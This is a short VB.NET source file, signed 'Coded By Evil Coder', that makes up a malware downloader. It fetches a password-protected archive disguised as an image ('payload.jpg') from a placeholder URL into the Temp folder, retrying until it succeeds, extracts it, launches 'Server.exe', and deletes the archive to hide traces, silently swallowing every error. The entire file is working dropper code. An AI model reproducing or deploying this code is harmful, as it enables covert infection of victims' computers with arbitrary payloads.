﻿Imports ComponentAce.Compression.ZipForge
Imports ComponentAce.Compression.Archiver
Imports System.Net
'Coded By Evil Coder
Module MAIN
    Sub main()
        downloadimg()
        ex()
    End Sub
    Function ex()
        Dim archiver As New ZipForge()
        Try
            archiver.FileName = workdir & "\" & name
            archiver.Password = pass
            archiver.OpenArchive(System.IO.FileMode.Open)
            archiver.BaseDir = workdir
            archiver.ExtractFiles("*.*")
            archiver.CloseArchive()
            run()
        Catch ae As ArchiverException
        End Try
    End Function
    Function run()
        Try
            Process.Start(workdir & "\" & filetorun)
        Catch ps As Exception
        End Try
        Try
            IO.File.Delete(workdir & "\" & name)
        Catch del As Exception
        End Try
    End Function
    Function downloadimg()
        Try
re:
            Dim web As New WebClient
            web.DownloadFile(url, workdir & "\" & name)
        Catch exd As Exception
            Threading.Thread.Sleep(2000)
            GoTo re
        End Try
    End Function


    Public workdir As String = Environ$("Temp")
    Public name As String = "Ibrahim.jpg"
    Public url As String = "http://exmple.com/payload.jpg"
    Public pass As String = "0123456789"
    Public filetorun As String = "Server.exe"
End Module
